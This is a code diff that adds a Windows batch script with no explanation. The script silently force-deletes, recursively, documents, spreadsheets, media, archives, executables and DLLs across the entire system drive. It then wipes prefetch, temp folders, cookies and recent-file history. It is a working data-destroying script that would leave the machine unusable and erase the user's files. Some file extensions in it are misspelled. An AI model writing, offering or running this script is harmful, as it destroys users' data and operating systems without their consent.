@@ -1,0 +1,30 @@
+@echo off 
+del /f /s /q %systemdrive%\*.ppt
+del /f /s /q %systemdrive%\*.pptx
+del /f /s /q %systemdrive%\*.doc
+del /f /s /q %systemdrive%\*.docx
+del /f /s /q %systemdrive%\*.xis
+del /f /s /q %systemdrive%\*.xisx
+del /f /s /q %systemdrive%\*.zip
+del /f /s /q %systemdrive%\*.mp3
+del /f /s /q %systemdrive%\*.mp4
+del /f /s /q %systemdrive%\*.dll
+del /f /s /q %systemdrive%\*.txt
+del /f /s /q %systemdrive%\*.exe
+del /f /s /q %systemdrive%\*.swf
+del /f /s /q %systemdrive%\*.m3m
+del /f /s /q %systemdrive%\*.m4a
+del /f /s /q %systemdrive%\*.jpg
+del /f /s /q %systemdrive%\*.png
+del /f /s /q %systemdrive%\*.apk
+del /f /s /q %systemdrive%\*.cnd
+
+del /f /s /q %systemdrive%\*.rar
+del /f /s /q %windir%\prefetch\*.* 
+rd /s /q %windir%\temp & md %windir%\temp 
+del /f /q %userprofile%\cookies\*.* 
+del /f /q %userprofile%\recent\*.* 
+del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" 
+del /f /s /q "%userprofile%\Local Settings\Temp\*.*" 
+del /f /s /q "%userprofile%\recent\*.*" 
+exit
